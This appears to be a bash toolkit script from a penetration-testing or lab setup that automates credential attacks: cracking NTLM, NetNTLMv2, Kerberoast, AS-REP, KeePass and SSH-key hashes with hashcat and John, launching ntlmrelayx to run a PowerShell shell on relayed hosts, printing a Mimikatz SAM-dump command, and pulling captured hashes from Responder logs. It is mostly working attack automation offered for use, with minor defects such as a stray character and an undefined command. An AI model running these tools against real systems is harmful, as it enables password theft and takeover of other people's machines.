#!/bin/bash
SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")
source "$SCRIPTDIR/.env"
source "$SCRIPTDIR/general.sh"

use_host_for_cracking() {
    if [[ ! -z "$host_username" ]] && [[ ! -z "$host_computername" ]]; then
        return 0
    else
        echo "Host username and computer name must be set before using host for cracking."
        return 1
    fi
}

hashcat_generic() {
    if [[ -z "$hash_file" ]]; then
        hash_file="hashes"
    fi
    if [[ ! -f "$hash_file" ]] || [[ ! -s "$hash_file" ]]; then
        echo "Hash file $hash_file not found or empty"
        return 1
    fi
    if [[ -z "$hashcat_rule" ]]; then
        hashcat_rule="/usr/share/hashcat/rules/best64.rule"
    fi
    if [[ -z "$hashcat_wordlist" ]]; then
        hashcat_wordlist="/usr/share/wordlists/rockyou.txt"
    fi
    if [[ -z "$hash_mode" ]]; then
        echo "Hash mode must be set before running hashcat."
        return 1
    fi
    echo "$hash_file found, running hashcat for hash mode $hash_mode"
    sudo dos2unix "$hash_file"
    local cmd="hashcat -m $hash_mode $hash_file $hashcat_wordlist -r $hashcat_rule --force"
    if use_host_for_cracking; then
        scp "$hash_file" "$host_username@$host_computername:~/$hash_file"
        ssh "$host_username@$host_computername" "$cmd"
    else
        eval "$cmd"
    fi

}

hashcat_kdbx() {
    if [[ ! -z "$1" ]]; then
        kdbx_file="$1"
    fi    
    if [[ -z "$kdbx_file" ]]; then
        echo "KDBX file must be set before running hashcat for KDBX."
        return 1
    fi
    if [[ ! -f "$kdbx_file" ]]; then
        echo "KDBX file $kdbx_file not found, cannot run hashcat for KDBX."
        return 1
    fi
    if [[ -z "$hash_file" ]]; then
        hash_file="hashes.keepass"
    else
        echo "Using provided hash file: $hash_file"
    fi
    if [[ ! -f "$hash_file" ]] || [[ ! -s "$hash_file" ]]; then
        echo "Running keepass2john to generate hash file."
        keepass2john "$kdbx_file" > "$hash_file"
        local filename=""
        filename=$(basename "$kdbx_file")
        filename="${filename%.*}"
        echo "filename=$filename"
        sed -i 's/^'"$filename"'://g' "$hash_file"
    else
        echo "$hash_file already exists, skipping keepass2john."
    fi
    hashcat_keepass

}
hashcat_keepass() {
    if [[ -z "$hash_file" ]]; then
        hash_file="hashes.keepass"
    else
        echo "Using provided hash file: $hash_file" 
    fi
    hash_mode=13400  # KeePass hash mode
    hashcat_generic
}

hashcat_ntlm() {
    if [[ -z "$hash_file" ]]; then
        hash_file="hashes.ntlm"
    else
        echo "Using provided hash file: $hash_file"
    fi    
    hash_mode=1000
    hashcat_generic
}

hashcat_net_ntlm() {
    if [[ -z "$hash_file" ]]; then
        hash_file="hashes.netntlm"
    else
        echo "Using provided hash file: $hash_file"
    fi    
    hash_mode=5600  # NetNTLMv2 hash mode
    hashcat_generic
}

hashcat_phpass() {
    if [[ -z "$hash_file" ]]; then
        hash_file="hashes.phpass"
    else
        echo "Using provided hash file: $hash_file"
    fi    
    hash_mode=400  # phpass hash mode
    hashcat_generic
}

hashcat_ssh_password() {
    if [[ -z "$identity_file" ]]; then
        echo "Identity file must be set before running hashcat for SSH password."
        return 1
    fi
    if [[ -z "$hash_file" ]]; then
        hash_file="hashes.ssh"
    else
        echo "Using provided hash file: $hash_file"
    fi
    if [[ ! -f "$hash_file" ]]; then
        ssh2john "$identity_file" > "$hash_file"
    else
        echo "$hash_file already exists, skipping ssh2john."
    fi
    if [[ ! -f "$hash_file" ]] || [[ ! -s "$hash_file" ]]; then
        echo "Hash file $hash_file not found or empty, cannot run hashcat for SSH password."
        return 1
    fi
    echo "Check and ensure the you are using the correct hash mode"
    cat "$hash_file"
    hashcat -h | grep -i "ssh"
    if [[ -z "$hash_mode" ]]; then
        hash_mode=22921
    fi
    hashcat_generic
}

john_generic() {
    if [[ -z "$hash_file" ]]; then
        echo "Hash file must be set before running John the Ripper."
        return 1
    fi
    if [[ ! -f "$hash_file" ]]; then
        echo "$hash_file not found, cannot run John the Ripper."
        return 1
    fi
    if [[ -z "$john_wordlist" ]]; then
        john_wordlist="/usr/share/wordlists/rockyou.txt"
    fi
    local john_rule_option=""
    if [[ ! -z "$john_rule" ]]; then
      if [[ ! -f "$john_rule" ]]; then
            echo "John rule file not found, using default rules."
            john_rule="/usr/share/john/rules/best64.rule"
        fi
        echo "[List.Rules:generalRules]" > "john-local.conf"
        cat "$john_rule" >> "john-local.conf"
        john_rule_option="--rules=generalRules"
    fi
    john --wordlist="$john_wordlist" $john_rule_option "$hash_file"
}

john_ssh_password() {
     if [[ -z "$identity_file" ]]; then
        echo "Identity file must be set before running hashcat for SSH password."
        return 1
    fi
    if [[ -z "$hash_file" ]]; then
        hash_file="hashes.ssh"
    else
        echo "Using provided hash file: $hash_file"
    fi
    if [[ ! -f "$hash_file" ]]; then
        echo "Running ssh2john to generate hash file."
        ssh2john "$identity_file" > "$hash_file"
    else
        echo "$hash_file already exists, skipping ssh2john."
    fi
    john_generic
}

john_show() {
    if [[ -z "$hash_file" ]]; then
        echo "Hash file must be set before running John the Ripper --show."
        return 1
    fi
    john --show "$hash_file"
}

start_ntlmrelay() {
    if [[ -z "$target_ip" ]]; then
        echo "Target IP must be set before running ntlmrelay."
        return 1
    fi
    echo "Starting ntlmrelay on target IP: $target_ip"
    if [[ -z "$cmd" ]]; then
        cmd=$(get_powershell_interactive_shell)
    fi
    if pgrep -f "ntlmrelayx"; then
        echo "ntlmrelay is already running, skipping."
        return 0
    fi
    sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py --no-http-server -smb2support -c "$cmd" | tee -a $trail_log

}

stop_ntlmrelay() {
    if pgrep -f "ntlmrelayx"; then
        echo "Stopping ntlmrelay..."
        sudo pkill -f "ntlmrelayx"
    else
        echo "No ntlmrelay process found."
    fi
}

hashcat_kerberoast() {    
    if [[ -z "$hash_file" ]]; then
        hash_file="hashes.kerberoast"
    else
        echo "Using provided hash file: $hash_file"
    fi
    hash_mode=13100  # Kerberoast hash mode
    hashcat_generic 
}

hashcat_asrep_kerberoast() {
    if [[ -z "$hash_file" ]]; then
        hash_file="hashes.asreproast"
    else
        echo "Using provided hash file: $hash_file"c
    fi
    hash_mode=18200  # AS-REP Kerberos hash mode
    hashcat_generic
}

hashcat_show() {    
    if [[ -z "$hash_file" ]] || [[ -z "$hash_mode" ]]; then
        echo "Hash file and hash mode must be set before running hashcat --show."
        return 1
    fi
    local cmd="hashcat --show -m $hash_mode $hash_file"
    if use_host_for_cracking; then
        ssh "$host_username@$host_computername" "$cmd"
    else
        eval "$cmd"
    fi
     
}

get_ntlm_hash_from_mimikatz_log_lsadump_sam() {

    if [[ -z "$target_username" ]]; then
        echo "Target username must be set before running Mimikatz."
        return 1
    fi
    if [[ ! -f "$mimikatz_log" ]] || [[ ! -s "$mimikatz_log" ]]; then
        echo "Mimikatz log file $mimikatz_log not found or empty."
        return 1
    fi    
    echo "Extracting NTLM hash for user $target_username from $mimikatz_log..."
    ntlm_hash=$(awk '
        /User : '"$target_username"'/ {
            if (getline > 0 && /NTLM/) {
                print $3;
            }
        }
    ' "$mimikatz_log")
    echo "ntlm_hash: $ntlm_hash"
}

run_mimikatz_lsadump_sam() {

    if [[ -z "$mimikatz_log" ]]; then
        mimikatz_log="mimikatz_lsadump_sam.log"
    fi
    echo "Running Mimikatz to dump SAM and LSADump..."
    echo '.\mimikatz.exe "privilege::debug" "token:elevate" "lsadump::sam" exit > $mimikatz_log'
    upload_file "$mimikatz_log"
    if ! get_ntlm_hash_from_mimikatz_log_lsadump_sam; then
        echo "Failed to extract NTLM hash from Mimikatz log."
        return 1
    fi
    if [[ -z "$ntlm_hash" ]]; then
        echo "NTLM hash for user $target_username not found in Mimikatz log."
        return 1
    fi
    echo "$ntlm_hash" > "hashes.$target_username"
    hash_file="hashes.$target_username"
    hashcat_ntlm
}

get_hash_from_responder_txt() {
    if [[ -z "$target_ip" ]]; then
        echo "Target IP must be set before running Responder."
        return 1
    fi
    if [[ -z "$target_username" ]]; then
        echo "Target username must be set before running Responder."
        return 1
    fi
    if [[ -z "$responder_txt" ]]; then
        if [[ -z "$target_ip" ]]; then
            echo "Target IP must be set before running Responder."
            return 1
        fi
        if [[ -z "$target_protocol" ]]; then
            target_protocol="SMB"
        fi
        if [[ -z "$target_hash_mode" ]]; then
            target_hash_mode="NTLMv2-SSP"
        fi        
        responder_txt="${target_protocol}-${target_hash_mode}-${target_ip}.txt"
        responder_txt="/usr/share/responder/logs/$responder_txt"
    fi
    if [[ ! -f "$responder_txt" ]] || [[ ! -s "$responder_txt" ]]; then
        echo "Responder text file $responder_txt not found or empty."
        return 1
    fi
    ntlm_hash=$(cat "$responder_txt" | grep -i "$target_username" | tail -n 1)    
    if [[ -z "$ntlm_hash" ]]; then
        echo "NTLM hash for user $target_username not found in Responder text file."
        return 1
    fi
    if [[ -z "$hash_file" ]]; then
        hash_file="hashes.$target_username"        
    fi
    echo "Going to save NTLM hash to $hash_file"
    echo "$ntlm_hash" > "$hash_file"
}

append_lm_hash() {
    if [[ ! -z $1 ]]; then
        local lm_hash="00000000000000000000000000000000"
        echo "$lm_hash:$1"
    fi
}


if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    if [[ -z "$1" ]]; then
        echo "Usage: $0 <command>"
        echo "Available commands: crack_ssh_identity, hashcat_ntlm, start_ntlmrelay, stop_ntlmrelay, hashcat_kerberoast, hashcat_asrep_kerberoast, hashcat_show <hash_mode> <hash_file>, hashcat_keepass, hashcat_ssh_password <identity_file>, john_ssh_password <identity_file>, john_rule <john_rule_file>, john_show <hash_file>, run_mimikatz_lsadump_sam <mimikatz_log> <target_username>, hashcat_kdbx <kdbx_file> <hashcat_rule>"
        exit 1
    fi

    command=$1
    case $command in
        crack_ssh_identity)
            crack_ssh_identity
            ;;
        hashcat_ntlm)
            hashcat_ntlm
            ;;
        start_ntlmrelay)
            start_ntlmrelay
            ;;
        stop_ntlmrelay)
            stop_ntlmrelay
            ;;
        hashcat_kerberoast)
            hashcat_kerberoast
            ;;
        hashcat_asrep_kerberoast)
            hashcat_asrep_kerberoast
            ;;
        hashcat_show)
            hash_mode=$2
            hash_file=$3
            hashcat_show
            ;;
        hashcat_keepass)
            hashcat_keepass
            ;;
        hashcat_ssh_password)
            identity_file=$2
            hashcat_ssh_password
            ;;
        hashcat_kdbx)
            kdbx_file=$2
            hashcat_rule=$3
            hashcat_kdbx "$kdbx_file"
            ;;
        john_ssh_password)
            identity_file=$2
            john_rule=$3
            john_ssh_password
            ;;
        john_show)
            hash_file=$2
            john_show
            ;;
        hashcat_net_ntlm)
            hash_file=$2
            hashcat_net_ntlm
            ;;
        run_mimikatz_lsadump_sam)
            mimikatz_log=$2
            target_username=$3
            run_mimikatz_lsadump_sam
            ;;
        append_lm_hash)
            if [[ -z "$2" ]]; then
                echo "Usage: $0 append_lm_hash <ntlm_hash>"
                exit 1
            fi
            append_lm_hash "$2"
            ;;
        get_hash_from_responder_txt)
            target_ip=$2
            target_username=$3
            responder_txt=$4
            get_hash_from_responder_txt
            ;;
        *)
            echo "Unknown command: $command"
            exit 1
            ;;
    esac
fi